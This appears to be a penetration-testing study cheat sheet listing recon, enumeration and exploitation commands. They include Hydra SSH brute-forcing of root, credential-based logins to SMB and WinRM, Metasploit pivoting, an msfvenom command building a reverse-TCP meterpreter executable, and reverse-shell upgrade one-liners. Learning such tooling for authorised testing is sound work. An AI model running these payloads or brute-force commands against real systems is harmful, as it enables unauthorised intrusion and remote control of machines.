1. Assessment Methodologies
1.1 Information Gathering – Passive
Tool / Command	Usage	Result
host {CMD}	DNS lookup	IPv4 + IPv6 + Mail Server
{URL}/robots.txt	Check disallowed paths	Unindexed folders/files
{URL}/sitemap.xml	Discover site structure	Website mapping
Wappalyzer (Browser Add-on)	Detect technologies	Technology stack
whatweb {CMD}	Detect technologies	Technology stack
httrack {CMD}	Clone website	Website source analysis
whois {CMD}	WHOIS lookup	Domain registration info
netcraft.com	Web tech + hosting info	Site report
dnsdumpster.com	DNS records visual map	DNS records
sublist3r {CMD}	Subdomain enumeration	Subdomain list
Google Dorks / GHDB	Search engine OSINT	Accidental leaks
theHarvester {CMD}	Harvest emails/domains	Email list
haveibeenpwned	Email breach check	Email leak DB

1.2 Information Gathering – Active
Tool / Command	Purpose	Result
wafw00f {CMD}	Detect WAF	WAF fingerprinting
dnsenum {CMD}	DNS brute force	DNS zone transfer
dnsrecon {CMD}	DNS recon	DNS records
nmap {CMD}	Port/service scan	Network mapping
netdiscover {CMD}	ARP scan	ARP host discovery
ping / fping	ICMP scan	ICMP host discovery
arp-scan {CMD}	ARP discovery	ARP host discovery
route -n	Routing table	Network layout

2. Enumeration & Footprinting
2.1 Enumeration Checklist by Service
Service	Port	Enumeration Steps	Tools
FTP	21	Version, auth brute-force, anonymous login	nmap, msf ftp_login
SMB	445	Version, users, shares, brute-force	nmap, smbclient, enum4linux
HTTP	80/443	Headers, dirs, robots.txt, brute-force	nmap, dirb, msf http_login
MySQL	3306	Version, schema dump, hash dump	mysql, msf mysql_login
SSH	22	Version, user enum, brute-force	nmap, msf ssh_login
SMTP	25	VRFY/EXPN, user enum	netcat, msf
RDP	3389	Service check, brute-force	Hydra, msf rdp_scanner

3. Exploitation & Vulnerability Assessment
3.1 Windows Targets
Service	Port	Purpose	Tool	Example Command
IIS	80/443	Web server	searchsploit	searchsploit iis
WebDAV	80/443	File server over HTTP	davtest, cadaver	davtest -url http://target/
SMB	445	File sharing	crackmapexec	crackmapexec smb target -u user -p pass
RDP	3389	Remote GUI	xfreerdp	xfreerdp /u:user /p:pass /v:ip
WinRM	5985/5986	Remote management	evil-winrm	evil-winrm -u user -p pass -i ip
NetBIOS	137-139	Hostname/Share enum	nbtscan	nbtscan ip
SNMP	161	Network device info	snmpwalk	snmpwalk -v2c -c public ip

3.2 Linux Targets
Service	Port	Purpose	Tool	Example
Apache	80/443	Web server	nmap --script vuln	nmap --script vuln -p80 target
SSH	22	Remote shell	hydra, msf ssh_login	hydra -l root -P pass.txt ssh://ip
FTP	21	File transfer	nmap --script ftp-anon	nmap -p21 --script ftp-anon ip
Samba	445	File sharing	smbclient	smbclient //ip/share

4. Useful Metasploit Tips
bash
Copy
Edit
# Start MSF DB
service postgresql start
db_status

# Import Nmap scan
db_import scan.xml

# Run Nmap from MSF
db_nmap -sV target

# Pivoting
run autoroute -s SUBNET
use auxiliary/server/socks_proxy
5. Payload Generation
bash
Copy
Edit
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
6. Reverse Shell Upgrade
bash
Copy
Edit
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
